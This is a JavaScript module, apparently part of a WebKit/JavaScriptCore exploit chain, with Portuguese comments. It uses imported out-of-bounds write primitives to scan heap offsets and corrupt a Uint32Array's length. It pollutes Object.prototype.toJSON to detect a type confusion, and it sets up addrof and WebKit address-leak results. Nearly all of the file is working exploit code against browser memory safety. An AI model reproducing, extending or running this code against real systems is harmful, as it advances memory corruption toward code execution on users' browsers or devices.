// js/script3/testArrayBufferVictimCrash.mjs (R43L - Busca de Offset para Corrupção ABV - CORRIGIDO)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    arb_read,
    oob_write_absolute,
    isOOBReady,
    selfTestOOBReadWrite,
} from '../core_exploit.mjs';
import { JSC_OFFSETS } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R43_OffsetSearchABV_Corrected";

const VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT = 8; // Definido consistentemente
const VICTIM_BUFFER_SIZE_BYTES_DEFAULT = VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT * 4;

const OOB_OFFSET_SEARCH_RANGE = { start: 0x50, end: 0xA0, step: 0x04 };
const OOB_WRITE_VALUE_FOR_OFFSET_SEARCH = 0xFFFFFFFF; // Valor correto a ser usado
// const OOB_WRITE_VALUE_FOR_OFFSET_SEARCH = 0x41414141; // Alternativa para teste

const FILL_PATTERN_OFFSET_SEARCH = 0xDEDEDEDE;
const PROBE_CALL_LIMIT_V82 = 10;

const FUNCTION_OFFSET_TO_EXECUTABLE_INSTANCE = new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET);
const ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL = 0x8;
const EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM = new AdvancedInt64(ASSUMED_EXECUTABLE_OFFSET_TO_JIT_CODE_OR_VM_VAL);

let targetFunctionForLeak;
let leaked_target_function_addr = null;

function isValidPointer(ptr, context = "") { /* ... (sem alteração) ... */
    if (!isAdvancedInt64Object(ptr)) { return false; }
    const high = ptr.high(); const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0x7FF80000 && low === 0x0) return false;
    if ((high & 0x7FF00000) === 0x7FF00000 && ((high & 0x000FFFFF) !== 0 || low !== 0)) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}
function logTypedArrayContentShort(ta, name = "TypedArray", maxElements = 4) {
    if (!ta || typeof ta.slice !== 'function') { return "N/A"; }
    const content = Array.from(ta.slice(0, Math.min(ta.length, maxElements))).map(v => `0x${(v >>> 0).toString(16)}`); // Usar >>> 0 para tratar como unsigned
    return `[${content.join(", ")}${ta.length > maxElements ? "..." : ""}] (len:${ta.length})`;
}
// Função toHex mais robusta para evitar "undefined" nos logs
function safeToHex(value, length = 8) {
    if (typeof value === 'number') {
        return '0x' + (value >>> 0).toString(16).padStart(length, '0');
    }
    if (value === null || value === undefined) {
        return String(value);
    }
    return toHex(value); // Fallback para o toHex original se não for número
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca de Offset ABV (Corrigido) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init OffsetSearchCor...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR43L_OffsetSearchCor() { /* ... */ };

    logS3(`--- Fase 0 (OffsetSearchCor): Sanity Checks ---`, "subtest", FNAME_CURRENT_TEST_BASE);
    let coreOOBReadWriteOK = false;
    try { coreOOBReadWriteOK = await selfTestOOBReadWrite(logS3, safeToHex); /* Passar safeToHex para selfTest se ele o usar para logs */ }
    catch (e_sanity) { logS3(`Erro Sanity: ${e_sanity.message}`, "critical"); coreOOBReadWriteOK = false; }
    logS3(`Sanity Check: ${coreOOBReadWriteOK ? 'SUCESSO' : 'FALHA'}`, coreOOBReadWriteOK ? 'good' : 'critical');
    await PAUSE_S3(100);

    if (!coreOOBReadWriteOK) {
        return { errorOccurred: "OOB Sanity Check Failed", tc_probe_details: null, stringifyResult: null, addrof_result: { success: false, msg: "Addrof (OffsetSearchCor): Not run.", /*...*/ }, webkit_leak_result: { success: false, msg: "WebKit Leak (OffsetSearchCor): Not run.", /*...*/ }, iteration_results_summary: [], total_probe_calls_last_iter: 0, oob_params_of_best_result: null, heisenbug_on_M2_in_best_result: false, abv_corruption_details_best: null };
    }

    let iteration_results_summary = [];
    let best_result_for_runner = {
        errorOccurred: null, tc_probe_details: null,
        addrof_result: { success: false, msg: "Addrof (OffsetSearchCor): Não tentado." },
        webkit_leak_result: { success: false, msg: "WebKit Leak (OffsetSearchCor): Não tentado." },
        oob_params_of_best_result: null,
        heisenbug_on_M2_confirmed_by_tc_probe: false,
        abv_corruption_details_best: null
    };
    let final_probe_call_count_for_report = 0;

    for (let current_critical_offset = OOB_OFFSET_SEARCH_RANGE.start; current_critical_offset <= OOB_OFFSET_SEARCH_RANGE.end; current_critical_offset += OOB_OFFSET_SEARCH_RANGE.step) {
        leaked_target_function_addr = null; // Não relevante aqui, mas mantido para estrutura
        const current_oob_write_val = OOB_WRITE_VALUE_FOR_OFFSET_SEARCH; // CORREÇÃO: Usar o valor correto
        const current_oob_hex_val = safeToHex(current_oob_write_val); // Usar safeToHex
        const current_offset_hex = safeToHex(current_critical_offset); // Usar safeToHex
        const FNAME_CURRENT_ITERATION = `${FNAME_CURRENT_TEST_BASE}_Off${current_offset_hex}_Val${current_oob_hex_val}`;

        logS3(`\n===== ITERATION OffsetSearchCor: Offset OOB: ${current_offset_hex}, Valor OOB: ${current_oob_hex_val} (Raw: ${current_oob_write_val}) =====`, "subtest", FNAME_CURRENT_ITERATION);
        document.title = `${FNAME_CURRENT_TEST_BASE} Off:${current_offset_hex}`;

        let victim_ta_ref = null;
        let iter_abv_corruption_details = { /* ... (estrutura como antes) ... */
            offset_tested: current_offset_hex, value_written: current_oob_hex_val,
            original_length: VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT, reported_length_after_oob: null,
            reported_byteLength_after_oob: null, read_high_index_ok: null,
            read_extreme_index_value: null, fill_pattern_intact: null, notes: ""
        };

        let probe_call_count_iter = 0; /*...*/ let marker_M1_ref_iter = null; let marker_M2_ref_iter = null;
        let iteration_final_tc_details_from_probe = null; let iteration_tc_first_detection_done = false;
        let heisenbugConfirmedThisIter = false;

        function toJSON_TA_Probe_Iter_Closure_OffsetSearchCor() { /* ... (sonda TC idêntica à anterior, com nome atualizado se desejar) ... */
            probe_call_count_iter++; const call_num = probe_call_count_iter;
            const ctts = Object.prototype.toString.call(this);
            const is_m2c = (this === marker_M2_ref_iter && marker_M2_ref_iter !== null);
            try {
                if (call_num > PROBE_CALL_LIMIT_V82) return { r_stop: "limit" };
                if (call_num === 1 && this === victim_ta_ref) {
                    marker_M2_ref_iter = { marker_id_offset_search_cor: "M2_OffsetSearchCor" };
                    marker_M1_ref_iter = { marker_id_offset_search_cor: "M1_OffsetSearchCor", payload_M2: marker_M2_ref_iter };
                    logS3(`[PROBE_OffsetSearchCor] Call #${call_num}: 'this' é victim_ta_ref. M1/M2 criados.`, "debug_detail");
                    return marker_M1_ref_iter;
                } else if (is_m2c) {
                    if (!iteration_tc_first_detection_done) {
                        iteration_tc_first_detection_done = true;
                        heisenbugConfirmedThisIter = true;
                        iteration_final_tc_details_from_probe = { call_number_tc_detected: call_num, probe_variant: "TA_Probe_OffsetSearchCor", this_type_actual: ctts, this_is_M2: true, notes: "TC Confirmada."};
                        logS3(`[PROBE_OffsetSearchCor] Call #${call_num} (M2C): FIRST TC. 'this' é M2. Tipo: ${ctts}`, "vuln_potential");
                    }
                    return this;
                }
            } catch (e_pm) { iteration_final_tc_details_from_probe = { error_probe: `ProbeMainErr:${e_pm.message}` }; console.error("[PROBE_OffsetSearchCor] Erro:", e_pm); return { err_pm:call_num,msg:e_pm.message};}
            return { gen_m: call_num, type: ctts };
        }

        let iter_primary_error = null;
        let iter_raw_stringify_output = null;
        let iter_stringify_output_parsed = null;

        try {
            logS3(`  --- Fase 1 (OffsetSearchCor): Escrita OOB (Off ${current_offset_hex}) e Análise ABV ---`, "subtest", FNAME_CURRENT_ITERATION);
            await triggerOOB_primitive({ force_reinit: true, caller_fname: `${FNAME_CURRENT_ITERATION}-OOBSetup` });
            oob_write_absolute(current_critical_offset, current_oob_write_val, 4); // CORREÇÃO: Usar current_oob_write_val
            logS3(`   OOB Write: Escrito ${current_oob_hex_val} no offset ${current_offset_hex}`, 'info');
            await PAUSE_S3(50);

            victim_ta_ref = new Uint32Array(VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT);
            // ... (restante da lógica de análise ABV, como no script anterior)
            iter_abv_corruption_details.original_length = victim_ta_ref.length;
            logS3(`   Victim Uint32Array criado. Comprimento esperado: ${VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT}. Comprimento real: ${victim_ta_ref.length}. ByteLength: ${victim_ta_ref.byteLength}`, 'info');
            iter_abv_corruption_details.reported_length_after_oob = victim_ta_ref.length;
            iter_abv_corruption_details.reported_byteLength_after_oob = victim_ta_ref.byteLength;

            if (victim_ta_ref.length !== VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT) {
                iter_abv_corruption_details.notes += `Comprimento CORROMPIDO! Esperado ${VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT}, obtido ${victim_ta_ref.length}. `;
                logS3(`   !!! COMPRIMENTO DO TYPEDARRAY CORROMPIDO !!! Esperado: ${VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT}, Obtido: ${victim_ta_ref.length}`, "success_major");
            }
             if (victim_ta_ref.length > VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT && victim_ta_ref.length < 0xFFFFFF) { // Evitar loop excessivo se length for enorme
                try {
                    const high_idx_to_read = Math.min(victim_ta_ref.length - 1, VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT + 100); // Ler um pouco mais
                    const val_at_high_idx = victim_ta_ref[high_idx_to_read];
                    iter_abv_corruption_details.read_high_index_ok = true;
                    iter_abv_corruption_details.read_extreme_index_value = safeToHex(val_at_high_idx);
                    logS3(`   Leitura em índice alto (${high_idx_to_read}) bem-sucedida: ${safeToHex(val_at_high_idx)}`, "vuln");
                } catch (e_read_high) { /*...*/ }
            }
            try {
                victim_ta_ref.fill(FILL_PATTERN_OFFSET_SEARCH);
                let pattern_ok = true;
                for(let i=0; i< Math.min(victim_ta_ref.length, VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT); i++) {
                    if(victim_ta_ref[i] !== FILL_PATTERN_OFFSET_SEARCH) { pattern_ok = false; break; }
                }
                iter_abv_corruption_details.fill_pattern_intact = pattern_ok;
                if (!pattern_ok) { iter_abv_corruption_details.notes += "Padrão de preenchimento não persistiu. "; logS3(`   Padrão NÃO persistiu. Conteúdo: ${logTypedArrayContentShort(victim_ta_ref)}`, "vuln_potential");}
                else { logS3(`   Padrão persistiu.`, "good"); }
            } catch (e_fill) { /*...*/ }


            logS3(`  --- Tentativa de Detecção de TC (OffsetSearchCor) ---`, "subtest", FNAME_CURRENT_ITERATION);
            const ppKey = 'toJSON'; let origDesc = Object.getOwnPropertyDescriptor(Object.prototype, ppKey); let polluted = false;
            try {
                Object.defineProperty(Object.prototype, ppKey, { value: toJSON_TA_Probe_Iter_Closure_OffsetSearchCor, writable: true, configurable: true, enumerable: false });
                polluted = true;
                iter_raw_stringify_output = JSON.stringify(victim_ta_ref);
                try { iter_stringify_output_parsed = JSON.parse(iter_raw_stringify_output); } catch (e_p) { /*...*/ }
                if (heisenbugConfirmedThisIter) { logS3(`  TC Probe (OffsetSearchCor): TC CONFIRMADA.`, "vuln_potential", FNAME_CURRENT_ITERATION); }
                else { logS3(`  TC Probe (OffsetSearchCor): TC NÃO Confirmada. Details: ${JSON.stringify(iteration_final_tc_details_from_probe)}`, "warn", FNAME_CURRENT_ITERATION); }
            } catch (e_str) { if (!iter_primary_error) iter_primary_error = e_str; /*...*/ }
            finally { if (polluted) { if (origDesc) Object.defineProperty(Object.prototype, ppKey, origDesc); else delete Object.prototype[ppKey]; } }
            logS3(`  --- Análise ABV e TC (OffsetSearchCor) Concluída. TC: ${heisenbugConfirmedThisIter} ---`, "subtest", FNAME_CURRENT_ITERATION);

        } catch (e_outer_iter) { if (!iter_primary_error) iter_primary_error = e_outer_iter; /*...*/ }
        finally { await clearOOBEnvironment({ caller_fname: `${FNAME_CURRENT_ITERATION}-FinalClear` }); }

        final_probe_call_count_for_report = probe_call_count_iter;
        let current_iter_summary = { /* ... (como antes, usando safeToHex para oob_offset e oob_value) ... */
            oob_offset: current_offset_hex, oob_value: current_oob_hex_val,
            raw_oob_offset: current_critical_offset, raw_oob_value: current_oob_write_val,
            error: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
            tc_probe_details: iteration_final_tc_details_from_probe,
            stringifyResult: iter_stringify_output_parsed,
            abv_corruption_details: iter_abv_corruption_details,
            addrof_result_this_iter: { success: false, msg: "Addrof (OffsetSearchCor): Não tentado." },
            webkit_leak_result_this_iter: { success: false, msg: "WebKit Leak (OffsetSearchCor): Não tentado." },
            heisenbug_on_M2_confirmed_by_tc_probe: heisenbugConfirmedThisIter
        };
        iteration_results_summary.push(current_iter_summary);

        // Lógica de best_result_for_runner (como antes)
        if (current_iter_summary.error === null) {
            let current_is_better_than_best = false;
            const current_length_corrupted = current_iter_summary.abv_corruption_details.reported_length_after_oob !== VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT;
            const current_read_high_ok = current_iter_summary.abv_corruption_details.read_high_index_ok === true;

            if (best_result_for_runner.errorOccurred !== null || best_result_for_runner.oob_params_of_best_result === null) {
                current_is_better_than_best = true;
            } else {
                const best_length_corrupted = best_result_for_runner.abv_corruption_details_best?.reported_length_after_oob !== VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT;
                const best_read_high_ok = best_result_for_runner.abv_corruption_details_best?.read_high_index_ok === true;
                let current_score = (current_length_corrupted ? 4 : 0) + (current_read_high_ok ? 2 : 0) + (current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                let best_score = (best_length_corrupted ? 4 : 0) + (best_read_high_ok ? 2 : 0) + (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe ? 1 : 0);
                if (current_score > best_score) current_is_better_than_best = true;
            }
            if (current_is_better_than_best) {
                best_result_for_runner = { /* ... (como antes) ... */
                    errorOccurred: null, tc_probe_details: current_iter_summary.tc_probe_details, stringifyResult: current_iter_summary.stringifyResult,
                    addrof_result: current_iter_summary.addrof_result_this_iter, webkit_leak_result: current_iter_summary.webkit_leak_result_this_iter,
                    oob_params_of_best_result: { offset: current_offset_hex, value: current_oob_hex_val, raw_offset: current_critical_offset, raw_value: current_oob_write_val },
                    heisenbug_on_M2_confirmed_by_tc_probe: current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe,
                    abv_corruption_details_best: current_iter_summary.abv_corruption_details
                };
                 logS3(`*** NOVO MELHOR RESULTADO com Offset: ${current_offset_hex} (LenCorrupt: ${current_length_corrupted}, TC: ${current_iter_summary.heisenbug_on_M2_confirmed_by_tc_probe}) ***`, "success_major", FNAME_CURRENT_ITERATION);
            }
        } else if (best_result_for_runner.oob_params_of_best_result === null && current_critical_offset === OOB_OFFSET_SEARCH_RANGE.end ) { /*...*/ }


        let iter_status = `Off ${current_offset_hex}: `;
        if (iter_abv_corruption_details.reported_length_after_oob !== VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT) iter_status += "LenCORRUPT! ";
        if (heisenbugConfirmedThisIter) iter_status += "TC_OK ";
        if (iter_status === `Off ${current_offset_hex}: `) iter_status += "NoEffect";
        document.title = `${FNAME_CURRENT_TEST_BASE} ${iter_status.trim()}`;
        await PAUSE_S3(100);
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    if (best_result_for_runner.oob_params_of_best_result) { /* ... */ } else { /* ... */ }
    logS3(`Best/Final result (OffsetSearchCor): ${JSON.stringify(best_result_for_runner, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);

    let final_title_status = "No Notable Result";
    if (best_result_for_runner.oob_params_of_best_result) {
        const best_params = best_result_for_runner.oob_params_of_best_result;
        const best_abv_corr = best_result_for_runner.abv_corruption_details_best;
        let parts = [];
        // CORREÇÃO AQUI: Acessar o original_length de abv_corruption_details_best
        if (best_abv_corr?.reported_length_after_oob !== best_abv_corr?.original_length) parts.push("LenCORRUPT!");
        if (best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe) parts.push("TC_OK");
        if (parts.length > 0) final_title_status = `Off ${best_params.offset}: ${parts.join(" ")}`;
        else if (best_result_for_runner.errorOccurred) final_title_status = `Off ${best_params.offset}: Error`;
        else final_title_status = `Off ${best_params.offset}: No TC/Corruption`;
    }
    document.title = `${FNAME_CURRENT_TEST_BASE}_R43L_Final: ${final_title_status}`;

    return { /* ... (estrutura de retorno como antes, garantindo que VICTIM_ARRAY_SIZE_ELEMENTS_DEFAULT é referenciado corretamente se necessário aqui ou no runner) ... */
        errorOccurred: best_result_for_runner.errorOccurred, tc_probe_details: best_result_for_runner.tc_probe_details,
        stringifyResult: best_result_for_runner.stringifyResult, addrof_result: best_result_for_runner.addrof_result,
        webkit_leak_result: best_result_for_runner.webkit_leak_result, iteration_results_summary: iteration_results_summary,
        total_probe_calls_last_iter: final_probe_call_count_for_report,
        oob_value_of_best_result: best_result_for_runner.oob_params_of_best_result ? `${best_result_for_runner.oob_params_of_best_result.offset}_${best_result_for_runner.oob_params_of_best_result.value}` : null,
        heisenbug_on_M2_in_best_result: best_result_for_runner.heisenbug_on_M2_confirmed_by_tc_probe,
        oob_params_of_best_result_detailed: best_result_for_runner.oob_params_of_best_result,
        abv_corruption_details_best_result: best_result_for_runner.abv_corruption_details_best
    };
}
